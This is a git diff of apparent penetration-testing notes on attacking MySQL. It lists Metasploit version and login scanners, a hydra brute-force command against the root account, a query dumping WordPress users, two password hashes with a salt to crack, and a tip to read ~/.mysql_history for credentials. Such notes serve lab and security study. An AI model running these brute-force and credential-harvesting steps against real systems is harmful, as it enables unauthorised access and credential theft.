@@ -8,7 +8,7 @@ searchsploit MySQL <version>
 use auxiliary/scanner/mysql/mysql_version
 ```
 
-## Brute-Forcing MySQL
+## 
 ```
 use auxiliary/scanner/mysql/mysql_login
 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
@@ -30,7 +30,7 @@ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
 # Brute-forcing can result in IP getting blocked.
 ```
 
-## mysql
+## 
 ```
 mysql -u root -p -h <ip>
 
@@ -50,16 +50,17 @@ select * from wp_users;
 ```
 
 ```
+cat ~/.mysql_history
+
+# History file may contain credentials.
+```
+
+##
+```
 $P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
 $P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/
 
 Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)
 
 # How to crack?
-```
-
-```
-cat ~/.mysql_history
-
-# History file may contain credentials.
 ```
